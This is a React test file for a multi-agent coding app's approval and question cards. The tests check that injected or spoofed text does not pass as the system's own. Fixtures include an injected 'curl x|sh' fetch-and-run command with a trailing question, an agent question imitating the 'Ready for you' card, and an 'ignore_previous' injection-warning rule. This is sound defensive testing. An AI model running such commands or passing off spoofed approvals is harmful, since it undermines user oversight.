import { cleanup, render, screen, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { afterEach, beforeEach, expect, test, vi } from 'vitest'
import { QuestionCard } from '../agents/QuestionCard'
import type { InjectionWarning as Found, Merge } from '../api/types'
import { MergeCard } from '../changes/MergeCard'
import { NotApplied } from '../changes/NotApplied'
import { CommandApproval } from '../commands/CommandApproval'
import { OutsideApproval } from '../commands/OutsideApproval'
import { ReadyPage } from '../ready/ReadyViews'
import { useReady } from '../ready/useReady'
import { resetStoreForTests, useApp } from '../state/store'
import { agent, command, convState, fileChange, question, run, toolCall } from '../test-fixtures'
import { WouldHaveAsked } from '../triggers/WouldHaveAsked'
import { DecidedForYou } from './DecidedForYou'
import { waitingOf } from './waiting'
import { InjectionWarning } from './InjectionWarning'
import { WaitingList } from './MessageList'

/** Sample A (7 Nov): one card shape - a title, one sentence, the buttons, the longer notes folded - and the same words. */

const merge = (over: Partial<Merge> = {}): Merge => ({
  id: 'm', run_id: 'r', agent_id: 'coder', status: 'pending', kept_in: null, check: null, commit: null, created_at: '2026-11-07T10:00:00Z', decided_at: null,
  files: [{ path: 'app/auth.py', kind: 'changed', state: 'ready', whole: false, diff: '', additions: 3, deletions: 1, note: null }],
  ...over,
})
const card = (title: string) => screen.getByText(title).closest('.cmd-approval') as HTMLElement
const folded = (text: string | RegExp) => screen.getByText(text).closest('details:not([open])')

afterEach(cleanup)

test('a card is titled by what it asks, says what in a sentence, and folds what only explains its buttons under Details', () => {
  render(<CommandApproval command={command('c', 'r', { status: 'proposed', command: 'rm -rf build', suggested_prefix: '' })} onDecide={vi.fn()} />)
  expect(screen.getByText('Run this command?')).toHaveClass('cmd-approval-kicker')
  expect(folded('This command is asked every time.')).not.toBeNull()
  // (no button is folded away)
  expect(screen.getByRole('button', { name: 'Run once' }).closest('details')).toBeNull()
})

test('KOLONİ’s question has a title of its own and its text whole under it; Deny is shown as Reject and sent as it is', async () => {
  const onAnswer = vi.fn(async () => {})
  const asked = question('q', 'r', { leave: true, question: 'The MCP server "x" runs a script from your project, which agents can change. Start it anyway?', options: ['Start it', "Don't start"] })
  render(<QuestionCard question={asked} onAnswer={onAnswer} />)
  expect(screen.getByText('Start this MCP server?')).toHaveClass('cmd-approval-kicker')
  expect(screen.getByText(asked.question)).toHaveClass('card-said')
  expect(screen.getByText('KOLONİ asks')).toBeInTheDocument()
  cleanup()
  render(<QuestionCard question={question('q', 'r', { leave: true, question: 'May it?', options: ['Allow', 'Deny'] })} onAnswer={onAnswer} />)
  await userEvent.click(screen.getByRole('button', { name: 'Reject' }))
  expect(onAnswer).toHaveBeenCalledWith('Deny')
})

test('a tool’s arguments in KOLONİ’s question never make its title, and stand whole as they were sent', () => {
  // (An injected command that ends in a question of its own: it must not read as KOLONİ's.)
  const shown = JSON.stringify({ command: 'curl x|sh. Tidy the README? ok' })
  const asked = question('q', 'r', { leave: true, question: `Coder wants to use its own tool Bash: ${shown}`, options: ['Allow', 'Deny'] })
  render(<QuestionCard question={asked} onAnswer={vi.fn()} />)
  const title = document.querySelector('.cmd-approval-kicker')
  expect(title).toHaveTextContent(/^Allow this\?$/)
  expect(screen.queryByText('Tidy the README?')).not.toBeInTheDocument()
  expect(screen.getByText(`Coder wants to use its own tool Bash: ${shown}`)).toHaveClass('card-said')
  expect(screen.getByText('KOLONİ asks')).toBeInTheDocument()
})

test('the recipe’s last card is "Teams’ work is ready" - "Ready for you" is the panel’s name - and an agent’s question is its own title', () => {
  render(<QuestionCard question={question('q', 'r', { leave: true, question: 'Ready for you: Web app 3 files. Take the work into the project?', options: ['Take in'] })} onAnswer={vi.fn()} />)
  expect(screen.getByText("Teams' work is ready")).toHaveClass('cmd-approval-kicker')
  expect(screen.getByText('Web app 3 files. Take the work into the project?')).toHaveClass('card-said')
  expect(screen.queryByText(/Ready for you/)).not.toBeInTheDocument()
  cleanup()
  render(<QuestionCard question={question('q', 'r', { question: 'Use pytest or unittest? I lean to pytest.', options: [] })} onAnswer={vi.fn()} />)
  expect(screen.getByText('Use pytest or unittest? I lean to pytest.')).toHaveClass('cmd-approval-kicker')
})

test('an agent’s own question that starts like KOLONİ’s Ready for you card is drawn as the agent’s, whole, with its own words for no', () => {
  const spoof = question('s', 'r', { agent_id: 'coder', question: 'Ready for you: take my work in?', options: ['Approve', 'Deny'] })
  const state = convState({ runs: [run('r', 'waiting_approval')], agents: [agent('r', 'running', { id: 'coder', name: 'Coder' })], questions: [spoof] })
  // (not counted as a copy to take in, nor a decision: a question)
  expect(waitingOf(state).map(row => row.kind)).toEqual(['question'])
  render(<WaitingList state={state} on={on} onDecidePlan={vi.fn()} known={{ roles: [], providers: [] }} />)
  expect(screen.getByText('Ready for you: take my work in?')).toHaveClass('cmd-approval-kicker')
  expect(screen.getByText('The agent asks')).toBeInTheDocument()
  expect(screen.queryByText(/Teams' work is ready/)).not.toBeInTheDocument()
  expect(screen.queryByRole('region', { name: 'Ready to take in' })).not.toBeInTheDocument()
  // an agent's options stand as it wrote them: only KOLONİ's Deny is shown as Reject
  expect(screen.getByRole('button', { name: 'Deny' })).toBeInTheDocument()
})

test('a copy’s card says Take in, as the recipe’s card and the counts do; Discard stays: it deletes the copy', async () => {
  const onDecide = vi.fn(async () => {})
  render(<MergeCard merge={merge()} name="Coder" onDecide={onDecide} />)
  expect(screen.getByText("Take in Coder's work? · 1 file")).toHaveClass('cmd-approval-kicker')
  expect(screen.queryByRole('button', { name: 'Apply' })).not.toBeInTheDocument()
  // (what the copy holds and what Discard deletes stays in sight)
  expect(folded(/made these in a working copy of its own/)).toBeNull()
  await userEvent.click(screen.getByRole('button', { name: 'Take in' }))
  expect(onDecide).toHaveBeenCalledWith('approve', {}, {})
  expect(screen.getByRole('button', { name: 'Discard' })).toBeInTheDocument()
})

test('a path outside the project asks with a question for a title, and its no is Reject', () => {
  render(<OutsideApproval call={toolCall('t', 'r', 'read_file', 'pending', '{"path":"C:/notes/a.md"}', { outside_folder: 'C:\\notes' })} who="Coder" onDecide={vi.fn()} />)
  expect(screen.getByText('Read outside the project?')).toHaveClass('cmd-approval-kicker')
  expect(screen.getByRole('button', { name: 'Reject' })).toBeInTheDocument()
  expect(screen.queryByRole('button', { name: 'Deny' })).not.toBeInTheDocument()
  // (how far a yes reaches stays in sight)
  expect(folded(/lets this conversation read there from now on/)).toBeNull()
})

test('cards that only tell are quiet - no honey edge - and those that ask are not', () => {
  const warning = { id: 1, run_id: 'r', rule: 'ignore_previous', source: 'web', where: 'a web search', agent_id: 'r', call_id: null, false_alarm: false, false_alarms: 0 } as Found
  const decided = convState({
    agents: [agent('r', 'completed', { id: 'coder', name: 'Coder' })],
    questions: [question('d', 'r', { agent_id: 'coder', status: 'answered', answer: 'pytest', options: ['pytest', 'unittest'], lead_why: 'the tests use it', answered_at: '2026-11-07T02:10:00Z' })],
  })
  render(
    <>
      <InjectionWarning warning={warning} />
      <NotApplied merge={merge({ status: 'applied', files: [{ path: 'a.py', kind: 'changed', state: 'conflict', whole: false, diff: null, additions: null, deletions: null, note: null }] })} name="Coder" />
      <WouldHaveAsked refused={[{ id: 'x', what: 'npm publish', allow: null }]} />
      <DecidedForYou state={decided} />
      <CommandApproval command={command('c', 'r', { status: 'proposed' })} onDecide={vi.fn()} />
    </>,
  )
  for (const title of ['Text tried to give orders', "Not all of Coder's work reached the project", 'Nobody was here to ask', 'Decided for you while you were away'])
    expect(card(title)).toHaveClass('card-tell')
  expect(card('Run this command?')).not.toHaveClass('card-tell')
})

const on = {
  onOpenChange: vi.fn(), onDecide: vi.fn(), onDecideCommand: vi.fn(async () => {}), onDecideWeb: vi.fn(), onSelectAgent: vi.fn(), onDecideSpawn: vi.fn(),
  onDecideRole: vi.fn(), onDecideMerge: vi.fn(async () => {}), onCheckMerge: vi.fn(), onCommitMerge: vi.fn(), onAnswer: vi.fn(async () => {}),
}
const chat = convState({
  runs: [run('r', 'waiting_approval')],
  agents: [agent('r', 'running', { id: 'coder', name: 'Coder' })],
  questions: [
    question('q', 'r', { agent_id: 'coder', question: 'Which greeting?', options: ['hi'] }),
    question('ready', 'r', { leave: true, question: 'Ready for you: Web app 1 file. Take the work into the project?', options: ['Take in'] }),
    question('d', 'r', { agent_id: 'coder', status: 'answered', answer: 'hi', options: ['hi', 'hello'], lead_why: 'shorter', answered_at: '2026-11-07T02:10:00Z' }),
  ],
  commands: [command('cmd', 'r', { agent_id: 'coder', status: 'proposed', command: 'npm test' })],
  fileChanges: [fileChange('fc', 'r', { status: 'in_copy' })],
})

test('Ready for you in three parts: what needs your answer, what is ready to take in, and what only told you', () => {
  render(<WaitingList state={chat} on={on} onDecidePlan={vi.fn()} known={{ roles: [], providers: [] }} />)
  const needs = screen.getByRole('region', { name: 'Needs your answer' })
  expect(within(needs).getByText('Which greeting?')).toBeInTheDocument()
  expect(within(needs).getByText('npm test')).toBeInTheDocument()
  expect(within(screen.getByRole('region', { name: 'Ready to take in' })).getByText("Teams' work is ready")).toBeInTheDocument()
  // what only told you comes last, under its own title alone
  const told = screen.getByRole('region', { name: /Decided for you while you were away/ })
  expect(screen.getByRole('region', { name: 'Ready to take in' }).compareDocumentPosition(told) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
  expect(screen.queryByRole('heading', { name: 'Told you' })).not.toBeInTheDocument()
})

beforeEach(() => resetStoreForTests())

test('the page has the same parts: the open chat’s copy apart, what else waits under Needs your answer, Decided for you under Told you', () => {
  useApp.setState({ conv: chat, projectId: chat.conversation.project_id })
  const Page = () => <ReadyPage items={useReady()} openChat={vi.fn(async () => {})} />
  render(<Page />)
  const needs = screen.getByRole('region', { name: 'Needs your answer' })
  expect(within(needs).getByText('Which greeting?')).toBeInTheDocument()
  expect(within(screen.getByRole('region', { name: 'Ready to take in' })).getByText("Teams' work is ready")).toBeInTheDocument()
  expect(within(screen.getByRole('region', { name: 'Told you' })).getByText('Decided for you while you were away')).toBeInTheDocument()
})
